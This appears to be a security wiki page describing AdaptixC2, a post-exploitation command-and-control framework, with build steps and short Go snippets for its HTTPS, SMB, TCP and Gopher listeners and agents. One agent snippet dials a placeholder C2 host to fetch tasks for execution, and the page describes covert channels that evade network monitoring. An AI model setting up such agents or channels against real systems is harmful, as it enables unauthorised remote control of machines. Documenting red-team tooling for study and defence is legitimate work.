# AdaptixC2

{{#include ../../banners/hacktricks-training.md}}

## What is AdaptixC2?

AdaptixC2 v0.6 is an extensible, cross-platform post-exploitation and adversarial emulation framework comprising:

- **AdaptixServer**: Multi-threaded server written in Go
- **AdaptixClient**: Qt C++ GUI client for operators
- **Extenders**: Plugin-based listeners and agents, loaded at runtime

All communications are fully encrypted over TLS 1.2/1.3, and the architecture supports flexible C2 channels on Linux, Windows, and macOS.

## Repository Layout

- `AdaptixServer/`
  - Core server in Go
  - `ssl_gen.sh`: Generates self-signed TLS certificates via `profile.json`
  - Static assets (`404page.html`) and REST endpoints
- `AdaptixClient/`
  - Qt C++ GUI source
  - Visualizes sessions, graphs, and provides remote shell
- `Extenders/`
  - Plugins for listeners and agents
  - Loaded at runtime from `dist/extenders/`
- `Makefile`
  - `clean`, `prepare`, `server`, `client`, `extenders`
  - Example build:
    ```bash
    go build -o dist/server -ldflags="-s -w" ./AdaptixServer
    setcap cap_net_bind_service=+ep dist/server
    mkdir -p dist/extenders && cp -R Extenders/* dist/extenders/
    ```
- `Dockerfile`
  - Multi-stage build (Go 1.23.7, Qt6, CMake, mingw-w64, OpenSSL)
  - Compiles server, client, extenders, exports `/app/dist` to scratch image
- `pre_install_linux_all.sh` & `pre_install_macos_client.sh`
  - Scripts to install Go, Qt6, CMake, mingw-w64, OpenSSL, Homebrew dependencies

## Key Features

- **Fully encrypted communications** over TLS 1.2/1.3
- **Plugin extensibility**: HTTP/S, SMB, TCP, mTLS Gopher listeners and agents
- **Post-exploitation modules**: task/job storage, file/process browsing, SOCKS4/5 proxying, local/reverse port forwarding, BOF injection
- **Agent controls**: health checks, configurable kill dates and working hours
- **Cross-platform agents** for Windows, Linux, and macOS
- **GUI session graphs** and remote terminal

## Current Extenders

- HTTP/S Beacon Listener
- SMB Beacon Listener
- TCP Beacon Listener
- Beacon Agent
- TCP/mTLS Gopher Listener
- Gopher Agent

## Installation & Build

### Prerequisites

- Go >= 1.24.4
- Qt6, CMake >= 3.31.5
- mingw-w64 (for Windows client)
- OpenSSL

### Build with Makefile

```bash
make prepare    # Install dependencies
make server     # Build AdaptixServer
make client     # Build AdaptixClient
make extenders  # Build all extenders
```

### Docker

```bash
docker build -t adaptixc2-builder .
# Extract built binaries
docker run --rm adaptixc2-builder tar -czf - -C /app/dist . > adaptixc2-dist.tar.gz
```

## Generating TLS Certificates

AdaptixC2 uses self-signed certificates defined in `profile.json`. To generate:

```bash
cd AdaptixServer
./ssl_gen.sh profile.json
```

## Extender Details

### HTTP/S Beacon Listener

Covert C2 channel over HTTPS using Goâ€™s `net/http`. Exposes:

- `/checkin` (GET): Agent polls for tasks
- `/results` (POST): Agent submits outputs

TLS certificates are loaded from `profile.json`. Payloads are serialized as JSON or binary over standard web traffic.

Example:
```go
handler := http.NewServeMux()
handler.HandleFunc("/checkin", s.handleCheckin)
handler.HandleFunc("/results", s.handleResults)
server := &http.Server{Addr: ":443", Handler: handler, TLSConfig: tlsConfig}
log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
```

### SMB Beacon Listener

Implements an SMB server via `github.com/hirochachacha/go-smb`. Agents mount or enumerate shares, write request files, and read response files. Tasks are encoded in file metadata or content to bypass network monitoring.

```go
srv := smb.NewServer(smb.Config{...})
srv.ListenAndServe()
```

### TCP Beacon Listener

Low-latency C2 over raw TCP. Listens on a configurable port, authenticates connections, and uses 4-byte length-prefix framing (`encoding/binary`).

```go
ln, _ := net.Listen("tcp", ":5555")
for {
  conn, _ := ln.Accept()
  go handleConnection(conn)
}
```

### TCP/mTLS Gopher Listener

Legacy Gopher protocol over mutual TLS. Configures a `tls.Listener` with `ClientAuth: tls.RequireAndVerifyClientCert`, decodes tasks embedded in Gopher selectors, and serves responses as Gopher menus.

```go
config := &tls.Config{
  ClientAuth: tls.RequireAndVerifyClientCert,
  Certificates: []tls.Certificate{serverCert},
}
ln, _ := tls.Listen("tcp", ":70", config)
```

### Beacon Agent

Modular payload (Go for Linux/macOS, C++ for Windows) that dynamically loads extender plugins (`plugin.Open()` or Qt plugin loader). Performs periodic beacons, unmarshals tasks, executes shell commands or BOF modules in memory (`syscall` injection), and marshals results.

### Gopher Agent

Constructs `gopher://` URIs with base64-encoded task identifiers, establishes `tls.Dial()` connections, sends selector lines to fetch tasks, and writes back results in subsequent requests, enabling stealthy bi-directional C2 over Gopher.

```go
conn, _ := tls.Dial("tcp", "c2.example.com:70", clientTLSConfig)
selector := fmt.Sprintf("/task/%s\r\n", base64.StdEncoding.EncodeToString(taskID))
fmt.Fprint(conn, selector)
// Read and execute task...
```

## References

- https://github.com/Adaptix-Framework/AdaptixC2
- AdaptixC2 v0.6 Release: https://github.com/Adaptix-Framework/AdaptixC2/releases/tag/v0.6

{{#include ../../banners/hacktricks-training.md}}